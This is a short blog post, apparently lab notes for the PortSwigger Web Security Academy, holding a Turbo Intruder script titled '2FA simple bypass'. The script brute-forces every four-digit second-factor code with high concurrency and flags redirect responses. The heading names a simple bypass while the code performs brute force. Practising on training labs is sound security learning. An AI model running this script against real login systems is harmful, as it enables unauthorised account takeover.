---
layout: post
title:  "PortSwigger WebSecurity Academy"
date:   2021-09-12
categories: 
---

{% capture details %}
{% highlight python linenos=table %}
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=25,
                           requestsPerConnection=200,
                           pipeline=False
                           )
    engine.start()

    for i in range(10000):
        engine.queue(target.req, '{0:04}'.format(i))

def handleResponse(req, interesting):
    if '302' in req.response:
        table.add(req)

{% endhighlight %}
{% endcapture %}
{% capture summary %} 
### 2FA simple bypass
{% endcapture %}{% include details.html %}